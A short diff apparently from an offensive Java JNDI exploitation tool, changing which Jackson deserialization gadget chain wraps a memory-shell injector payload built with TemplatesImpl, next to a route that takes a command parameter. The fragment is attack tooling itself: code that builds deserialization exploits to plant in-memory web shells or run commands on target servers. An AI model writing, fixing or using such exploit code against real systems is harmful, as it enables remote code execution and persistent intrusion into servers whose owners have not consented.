@@ -210,7 +210,7 @@ public class DeserializeController implements Controller {
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
-        return Jackson17.createB(templatesImpl);
+        return Jackson17.createA(templatesImpl);
     }
 
     @JNDIMapping("/Jackson17B/Command/{cmd}")
